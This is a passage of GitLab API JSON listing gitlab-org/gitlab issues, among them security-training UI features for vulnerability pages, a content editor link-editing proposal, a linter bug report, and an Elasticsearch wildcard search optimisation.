Martins","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4906322/avatar.png","web_url":"https://gitlab.com/zmartins"},"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346072","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":10,"completed_count":3},"weight":3,"blocking_issues_count":0,"has_tasks":true,"task_status":"3 of 10 checklist items completed","_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346072","notes":"https://gitlab.com/api/v4/projects/278964/issues/346072/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346072/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346072","relative":"#346072","full":"gitlab-org/gitlab#346072"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6820,"epic":{"id":355873,"iid":6820,"title":"Enhancing `scan_result_policy` from its initial implementation","url":"/groups/gitlab-org/-/epics/6820","group_id":9970,"human_readable_end_date":"Mar 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97583407,"iid":346071,"project_id":278964,"title":"Create security training documentation","description":"\nEpic: https://gitlab.com/groups/gitlab-org/-/epics/6176  \nDesign: https://gitlab.com/gitlab-org/gitlab/-/issues/326054\n\n\u003e This is all net-new functionality. We should also update the following pages with appropriate screenshots and callouts of the new capability:\n\u003e \n\u003e * https://docs.gitlab.com/ee/user/application_security/vulnerabilities/","state":"closed","created_at":"2021-11-18T21:33:42.830Z","updated_at":"2022-03-15T21:36:50.962Z","closed_at":"2022-03-15T21:36:50.263Z","closed_by":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"labels":["Deliverable","Technical Writing","devops::secure","documentation","frontend","group::threat insights","section::sec","type::maintenance","workflow::verification"],"milestone":null,"assignees":[{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"}],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"user_notes_count":8,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346071","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346071","notes":"https://gitlab.com/api/v4/projects/278964/issues/346071/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346071/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346071","relative":"#346071","full":"gitlab-org/gitlab#346071"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6176,"epic":{"id":287896,"iid":6176,"title":"Integrate developer security training into vulnerability management","url":"/groups/gitlab-org/-/epics/6176","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97583335,"iid":346070,"project_id":278964,"title":"Edit link description, title, and URL separately in the content editor","description":"## Problem to solve\n\nMarkdown supports creating links with a description, title, and URL. Creating a link in the content editor is easy, but manipulating that link afterward can be a little tricky. There is no direct support for setting a link title (for accessibility reasons) without switching over to the raw Markdown.\n\n## Proposal\n\nInserting or editing a link should prompt you to provide a URL, description (default to the URL), and a title (default empty, optional).\n\n## Availability and Testing\n\nProvided the functionality has lower level test coverage, no changes to E2E suite required, however, we should ensure the happy path test [content_editor_spec](https://gitlab.com/gitlab-org/gitlab/-/blob/master/qa/qa/specs/features/browser_ui/3_create/wiki/content_editor_spec.rb) still passes in the MR.","state":"closed","created_at":"2021-11-18T21:31:23.344Z","updated_at":"2022-05-24T12:00:37.831Z","closed_at":"2022-04-28T11:53:11.847Z","closed_by":{"id":2398164,"username":"himkp","name":"Himanshu Kapoor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2398164/avatar.png","web_url":"https://gitlab.com/himkp"},"labels":["Content Editor","Deliverable","GitLab Free","devops::create","feature::enhancement","frontend","group::editor","quad-planning::complete-action","section::dev","type::feature","workflow::ready for development"],"milestone":{"id":2095271,"iid":65,"group_id":9970,"title":"15.0","description":"","state":"active","created_at":"2021-06-08T15:35:34.814Z","updated_at":"2021-11-02T18:23:35.115Z","due_date":"2022-05-17","start_date":"2022-04-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/65"},"assignees":[{"id":2398164,"username":"himkp","name":"Himanshu Kapoor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2398164/avatar.png","web_url":"https://gitlab.com/himkp"}],"author":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"type":"ISSUE","assignee":{"id":2398164,"username":"himkp","name":"Himanshu Kapoor","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/2398164/avatar.png","web_url":"https://gitlab.com/himkp"},"user_notes_count":2,"merge_requests_count":0,"upvotes":2,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346070","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346070","notes":"https://gitlab.com/api/v4/projects/278964/issues/346070/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346070/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346070","relative":"#346070","full":"gitlab-org/gitlab#346070"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6228,"epic":{"id":292771,"iid":6228,"title":"Improve the UX of the Content Editor","url":"/groups/gitlab-org/-/epics/6228","group_id":9970,"human_readable_end_date":"Jul 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97582925,"iid":346067,"project_id":278964,"title":"Create training in vulnerability modal","description":"Add training section to the vulnerability modal\n\n\u003cimg src=\"/uploads/60a03ec707f1f66328ec534372ae37e2/B3-DET_modal-unified_schema-security_training.png\" height=\"500px\"\u003e\n\n\n\n\nWhen we are querying we'll use the [skeleton loading](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-skeleton-loading--default) pattern\n\n![image](/uploads/941a0c1d48497eda30b94ef15ac87e48/image.png)\n\nAnd if no training is found, here's how it should look like\n\n![image](/uploads/e0bf3f0e45aa5ce00ac539ec9554bb69/image.png)\n\n## Implementation Plan\n\nPlease see spike issue for detail on the vendor API usage \u003e https://gitlab.com/gitlab-org/gitlab/-/issues/346069","state":"closed","created_at":"2021-11-18T21:19:13.537Z","updated_at":"2022-03-15T21:35:57.213Z","closed_at":"2022-03-15T21:35:57.186Z","closed_by":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"labels":["auto updated","missed:14.8","type::feature"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"}],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346067","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":4,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346067","notes":"https://gitlab.com/api/v4/projects/278964/issues/346067/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346067/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346067","relative":"#346067","full":"gitlab-org/gitlab#346067"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6176,"epic":{"id":287896,"iid":6176,"title":"Integrate developer security training into vulnerability management","url":"/groups/gitlab-org/-/epics/6176","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97582658,"iid":346066,"project_id":278964,"title":"Create training in vulnerability details page","description":"Add training section to the vulnerability details page\n\n| Mock 1 |  Mock 2 (page unified schema) | \n| ------ | ------ |\n|![B1-DET_page-security_training](/uploads/8578c01b33e0b615120418e3b0f16746/B1-DET_page-security_training.png) | ![B2-DET_page-unified_schema-security_training](/uploads/6a52d4900a330648687f331e76c38948/B2-DET_page-unified_schema-security_training.png)|\n\nWhen we are querying we'll use the [skeleton loading](https://gitlab-org.gitlab.io/gitlab-ui/?path=/story/base-skeleton-loading--default) pattern\n\n\u003cimg src=\"/uploads/407457dc19778c8f05e5743dd2eed64d/2021-11-18_at_10.16_PM.png\" height=\"300px\"\u003e\n\nAnd if no training is found, here's how it should look like\n\n\u003cimg src=\"/uploads/e0bf3f0e45aa5ce00ac539ec9554bb69/image.png\" height=\"200px\"\u003e\n\n## Implementation Plan\n\nPlease see spike issue for detail on the vendor API usage \u003e https://gitlab.com/gitlab-org/gitlab/-/issues/346069","state":"closed","created_at":"2021-11-18T21:09:50.584Z","updated_at":"2022-02-12T15:04:17.110Z","closed_at":"2022-01-18T12:37:03.553Z","closed_by":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"labels":["auto updated","devops::secure","frontend","group::threat insights","section::sec","type::feature"],"milestone":{"id":2156369,"iid":68,"group_id":9970,"title":"14.7","description":"","state":"active","created_at":"2021-07-21T17:39:41.786Z","updated_at":"2021-07-21T17:39:41.786Z","due_date":"2022-01-17","start_date":"2021-12-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/68"},"assignees":[{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"}],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346066","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346066","notes":"https://gitlab.com/api/v4/projects/278964/issues/346066/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346066/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346066","relative":"#346066","full":"gitlab-org/gitlab#346066"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6176,"epic":{"id":287896,"iid":6176,"title":"Integrate developer security training into vulnerability management","url":"/groups/gitlab-org/-/epics/6176","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97582543,"iid":346065,"project_id":278964,"title":"Static Site Editor linter repositioned text incorrectly","description":"### Summary\n\nOn the GitLab handbook I clicked \"Open in Static Site Editor (Beta)\". It was a really cool experience! Nice window for editing, simple commit + MR workflow, loved it.\n\nHowever automatically, without my acknowledgement or awareness, it added a commit which linted the markdown. In doing so, it moved text incorrectly.\n\n### Steps to reproduce\n\nLikely you need to have poorly formatted markdown with funky lists to reproduce. A minimal reproduction case hasn't been created, but could be generated from the below commit.\n\n### Example Project\n\nHere is the commit where the reposition was introduced: https://gitlab.com/gitlab-com/www-gitlab-com/-/merge_requests/94196/diffs?commit_id=9ee763eaeedd5a9e66f2f44815eb1d0eb0106fd6#d67edb9705eca7b4ef02fdf7f5a4092b31f43ffd_30_25\n\n![Screen_Shot_2021-11-19_at_9.59.21_AM](/uploads/bf1d7f8bd14937c6479b055f6de57b17/Screen_Shot_2021-11-19_at_9.59.21_AM.png)\n\n### What is the current *bug* behavior?\n\nA line of content is incorrectly repositioned, changing the content and meaning of the document.\n\n### What is the expected *correct* behavior?\n\nThe line should not move. The linter should probably remove the indentation? Not sure.\n\nIdeally the linter should also ask if I want the page to be linted. This was such a simple change that having the linter do its thing made it into a messy MR.\n\n### Relevant logs and/or screenshots\n\nHere's the line as rendered in the handbook\n\n![Screen_Shot_2021-11-19_at_10.00.23_AM](/uploads/aa49be856f9446d72c26f28673e6d3b6/Screen_Shot_2021-11-19_at_10.00.23_AM.png)\n\n### Output of checks\n\nGitLab.com / GitLab Enterprise Edition 14.5.0-pre 342adf4e264","state":"closed","created_at":"2021-11-18T21:05:30.710Z","updated_at":"2021-11-22T17:36:01.985Z","closed_at":"2021-11-22T17:36:01.973Z","closed_by":{"id":5212466,"username":"ericschurter","name":"Eric Schurter","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/5212466/avatar.png","web_url":"https://gitlab.com/ericschurter"},"labels":["devops::create","frontend","group::editor","priority::3","section::dev","severity::3","type::bug","workflow::ready for development"],"milestone":{"id":490705,"iid":14,"group_id":9970,"title":"Backlog","description":"Issues that we want to do but are not planned right now. Open for contribution from the community.","state":"active","created_at":"2018-03-22T13:09:23.767Z","updated_at":"2018-10-30T14:56:54.069Z","due_date":null,"start_date":null,"expired":false,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/14"},"assignees":[],"author":{"id":9820844,"username":"nmalcolm","name":"Nick Malcolm","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9820844/avatar.png","web_url":"https://gitlab.com/nmalcolm"},"type":"ISSUE","assignee":null,"user_notes_count":2,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346065","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":1,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346065","notes":"https://gitlab.com/api/v4/projects/278964/issues/346065/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346065/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346065","relative":"#346065","full":"gitlab-org/gitlab#346065"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97580221,"iid":346062,"project_id":278964,"title":"Remove wildcard prefix searches","description":"## Problem\n\nWilcard prefix queries are terribly slow because they force Elasticsearch to look into almost every possible location in a shard for a match. Furthermore, we currently get bursts of wildcard searches which affect our latency spikes.\n\n![image](/uploads/9761442888e98057633fffed326041cc/image.png)\n\nRight now, **every blob search that includes `path` or `extension`** [includes a wildcard prefix query](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/lib/elastic/latest/git_class_proxy.rb#L148-153). :scream: Here's an [example search](https://gitlab.com/search?search=path%3Atest\u0026group_id=9970\u0026project_id=278964) that looks for `path:test` and [another one](https://gitlab.com/search?search=extension%3Atxt\u0026group_id=9970\u0026project_id=278964) that searches for `extension:txt`. They will be slow if they are not cached. :turtle:  \n\n\n![image](/uploads/6d5ca13e5d61a691797b6aa6cecde018/image.png)\n\n\n## Solution to remove wildcard prefix searches\n\nIf you search for something with `extension:md`, We are actually [converting that to a wildcard prefix query](https://gitlab.com/gitlab-org/gitlab/-/blob/master/ee/lib/elastic/latest/git_class_proxy.rb#L151) on the path, like this: `path:*.md`. We can easily avoid this if we simply index `extension` as a keyword and convert the wildcard query to a terms query to significantly improve performance.\n\n- Option A (Indexer route) [- total weight: 7 -]\n    1. Update Blob's index mapping to include `extension` [+ weight: 0 +]\n    1. Update indexer to start indexing `extension` https://gitlab.com/gitlab-org/gitlab-elasticsearch-indexer/-/merge_requests/134 [+ weight: 1 +]\n    1. Bump indexer version [+ weight: 0 +]\n    1. Add new indexer to Rails [+ weight: 1 +]\n    1. Reindex `gitlab-production` to populate `extension` [+ weight: 2 +]\n    1. Update Rails query code: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74663 [+ weight: 3 +]\n- Option B (Ingest pipeline route) [- total weight: 7 -]\n    1. Create an [ingest pipeline](https://www.elastic.co/guide/en/elasticsearch/reference/master/ingest.html) called something like `filename-extension-pipeline` that parses out the extension from `file_name` in Blobs [+ weight: 1 +]\n    1. Attach `filename-extension-pipeline` to `gitlab-production` index [+ weight: 1 +]\n    1. Reindex `gitlab-production` to populate `extension` [+ weight: 2 +]\n    1. Update Rails query code: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74663 [+ weight: 3 +]\n- Option C (hybrid)\n    1. Mix of steps in Option A and Option B\n        1. Using ingest pipeline route to backfill data\n        1. Remove ingest pipeline\n        1. Use indexer to index `extension` moving forward\n- Option D (reindex script hybrid)\n    1. Update Blob's index mapping to include `extension` [+ weight: 0 +]\n    1. Update indexer to start indexing `extension` https://gitlab.com/gitlab-org/gitlab-elasticsearch-indexer/-/merge_requests/134 [+ weight: 1 +]\n        - Add parameter that tells indexer NOT to index extension \n    1. Reindex `gitlab-production` to populate `extension` **using reindex script** [+ weight: 2 +]\n    1. Update Rails query code: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74663 [+ weight: 3 +]\n- Option E (update by query)\n    1. Update Blob's index mapping to include `extension` [+ weight: 0 +]\n    1. Update indexer to start indexing `extension` https://gitlab.com/gitlab-org/gitlab-elasticsearch-indexer/-/merge_requests/134 [+ weight: 1 +]\n        - Add parameter that tells indexer NOT to index extension \n    1. Reindex `gitlab-production` to populate `extension` **using _update_by_query script** [+ weight: 2 +]\n    1. Update Rails query code: https://gitlab.com/gitlab-org/gitlab/-/merge_requests/74663 [+ weight: 3 +]","state":"closed","created_at":"2021-11-18T20:10:06.196Z","updated_at":"2022-05-30T16:00:41.841Z","closed_at":"2021-12-09T19:43:19.979Z","closed_by":{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"},"labels":["Category:Global Search","auto updated","devops::data_stores","feature::enhancement","group::global search","section::enablement","type::feature"],"milestone":{"id":2114820,"iid":67,"group_id":9970,"title":"14.6","description":"https://about.gitlab.com/releases/archives.html","state":"closed","created_at":"2021-06-23T05:00:52.094Z","updated_at":"2022-04-21T07:26:38.271Z","due_date":"2021-12-17","start_date":"2021-11-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/67"},"assignees":[{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"}],"author":{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"},"type":"ISSUE","assignee":{"id":9717668,"username":"john-mason","name":"John Mason","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/9717668/avatar.png","web_url":"https://gitlab.com/john-mason"},"user_notes_count":13,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346062","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":7,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346062","notes":"https://gitlab.com/api/v4/projects/278964/issues/346062/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346062/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346062","relative":"#346062","full":"gitlab-org/gitlab#346062"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":null,"epic":null,"iteration":null,"health_status":null},{"id":97579172,"iid":346060,"project_id":278964,"title":"Create configuration security training: add info popover","description":"Create Info popover support to security training vendors\n\n| Mock 1 | Mock 2 |\n| ------ | ------ |\n| ![2021-11-18_at_8.41_PM](/uploads/7df57a0b3d4375d3581607fe7d2a2f58/2021-11-18_at_8.41_PM.png) | ![image](/uploads/c41947c3f640d537595a4231edbd9f3e/image.png) |\n\n\n## Note\n\nThe issue will be further broken down. This will ensure we keep our changes and [MR as small as possible](https://about.gitlab.com/handbook/values/#make-small-merge-requests).\n\n| Issue | Changes |\n| ------ | ------ |\n| https://gitlab.com/gitlab-org/gitlab/-/issues/346057 | Add Security training section |\n| https://gitlab.com/gitlab-org/gitlab/-/issues/346059 | Add \"Primary training\" |\n| This Issue | Add info popover |","state":"closed","created_at":"2021-11-18T19:44:13.010Z","updated_at":"2022-03-21T17:39:54.437Z","closed_at":"2022-03-16T23:23:11.098Z","closed_by":{"id":4155411,"username":"dpisek","name":"David Pisek","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4155411/avatar.png","web_url":"https://gitlab.com/dpisek"},"labels":["Deliverable","auto updated","devops::secure","frontend","group::threat insights","section::sec","type::feature","workflow::ready for development"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":null,"user_notes_count":5,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346060","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346060","notes":"https://gitlab.com/api/v4/projects/278964/issues/346060/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346060/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346060","relative":"#346060","full":"gitlab-org/gitlab#346060"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6176,"epic":{"id":287896,"iid":6176,"title":"Integrate developer security training into vulnerability management","url":"/groups/gitlab-org/-/epics/6176","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97578994,"iid":346059,"project_id":278964,"title":"Create configuration security training: add primary training support","description":"Create \"Primary training\" support to security training vendors\n\n\n\u003cimg src=\"/uploads/1eeec112526bbeabe0878ac98fefed75/2021-11-18_at_8.41_PM.png\" height=\"400px\"\u003e\n\n| All disabled (default state) | Toggled |  Training saved \u0026 enabled | \n| ------ | ------ | ------ | \n| ![C1-UC_CONFIG__Security_training-all_disabled](/uploads/e491162e4e5d5f1f06463498d3cb2478/C1-UC_CONFIG__Security_training-all_disabled.png)| ![C2-UC_CONFIG__Security_training-toggled](/uploads/63c17fcea939b54cf6b290a10075ae50/C2-UC_CONFIG__Security_training-toggled.png)|![C3-UC_CONFIG__Security_training-saved___enabled](/uploads/9aed5d91b1f99d5bb8a2c66779fb8c79/C3-UC_CONFIG__Security_training-saved___enabled.png) |\n\n| Primary training popover detail |\n| ------ | \n| ![C4-UC_CONFIG__Security_training-primary_training_info](/uploads/7ba15a4e35b140bb121f6da21e9a0167/C4-UC_CONFIG__Security_training-primary_training_info.png)  | \n| `Training from this partner takes precedence when more than one training partner is enabled.` \n\n\nMore info on uses cases \u003e https://www.loom.com/share/2b05d387bcc34d2bb44fc28f864e6a9c (starts 4:45)\n\n- User can enable/disable vendor detail\n- User can enable/disable primary training\n- Anytime the user disable something, it will return to the default state\n- There can only be one \"primary training\" vendor","state":"closed","created_at":"2021-11-18T19:39:55.920Z","updated_at":"2022-03-21T17:39:54.477Z","closed_at":"2022-03-16T23:24:21.681Z","closed_by":{"id":4155411,"username":"dpisek","name":"David Pisek","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/4155411/avatar.png","web_url":"https://gitlab.com/dpisek"},"labels":["Deliverable","auto updated","devops::secure","frontend","group::threat insights","section::sec","type::feature","workflow::in review"],"milestone":{"id":2204140,"iid":71,"group_id":9970,"title":"14.9","description":"","state":"active","created_at":"2021-08-26T19:11:46.841Z","updated_at":"2022-03-22T13:29:17.028Z","due_date":"2022-03-17","start_date":"2022-02-18","expired":true,"web_url":"https://gitlab.com/groups/gitlab-org/-/milestones/71"},"assignees":[],"author":{"id":3993566,"username":"sming-gitlab","name":"Samantha Ming","state":"active","avatar_url":"https://gitlab.com/uploads/-/system/user/avatar/3993566/avatar.png","web_url":"https://gitlab.com/sming-gitlab"},"type":"ISSUE","assignee":null,"user_notes_count":9,"merge_requests_count":0,"upvotes":0,"downvotes":0,"due_date":null,"confidential":false,"discussion_locked":null,"issue_type":"issue","web_url":"https://gitlab.com/gitlab-org/gitlab/-/issues/346059","time_stats":{"time_estimate":0,"total_time_spent":0,"human_time_estimate":null,"human_total_time_spent":null},"task_completion_status":{"count":0,"completed_count":0},"weight":2,"blocking_issues_count":0,"has_tasks":false,"_links":{"self":"https://gitlab.com/api/v4/projects/278964/issues/346059","notes":"https://gitlab.com/api/v4/projects/278964/issues/346059/notes","award_emoji":"https://gitlab.com/api/v4/projects/278964/issues/346059/award_emoji","project":"https://gitlab.com/api/v4/projects/278964","closed_as_duplicate_of":null},"references":{"short":"#346059","relative":"#346059","full":"gitlab-org/gitlab#346059"},"severity":"UNKNOWN","moved_to_id":null,"service_desk_reply_to":null,"epic_iid":6176,"epic":{"id":287896,"iid":6176,"title":"Integrate developer security training into vulnerability management","url":"/groups/gitlab-org/-/epics/6176","group_id":9970,"human_readable_end_date":"Apr 17, 2022","human_readable_timestamp":"\u003cstrong\u003ePast due\u003c/strong\u003e"},"iteration":null,"health_status":null},{"id":97577729,"iid":346057,"project_id":278964,"title":"Create configuration security training","description":"Create the new \"Vulnerability management\" tab and add the \"Security Training\" Section.\n\n| Current | Mock |\n| ------ | ------ |\n| ![image](/uploads/172793141c0bca344d29e590b1ce019f/image.png) | ![2021-11-18_at_8.22_PM](/uploads/4d898c30cccdb973a6cee32dc53493d6/2021-11-18_at_8.22_PM.png) |\n\n\n\n| All disabled | Toggled |  Training saved \u0026 enabled | \n| 